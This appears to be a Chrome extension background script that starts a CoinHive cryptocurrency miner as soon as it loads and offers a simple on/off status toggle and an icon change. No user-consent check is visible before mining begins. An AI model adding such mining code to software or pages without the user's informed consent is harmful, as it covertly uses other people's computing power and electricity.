'use strict';

// Miner

var miner = new CoinHive.User(KEY, settings.id, settings.minerOptions);
miner.start();

// \Miner

if(settings.minerOptions.autoThreads) {
	chrome.browserAction.setIcon({path:"icon-boost.png"});
} else {
	chrome.browserAction.setIcon({path:"icon.png"});
}

function Status() {
	this.status = true;
	this.notStarted = true;

	this.isNotStarted = function() {
		if(this.notStarted) {
			this.notStarted = false;
			return true;
		} else
			return this.notStarted;
	}
	this.getStatus = function() {
		return this.status;
	}
	this.changeStatus = function() {
		this.status = !this.status;
	}

	setTimeout(this.isNotStarted.bind(this), 3000);
};

var minerStatus = new Status();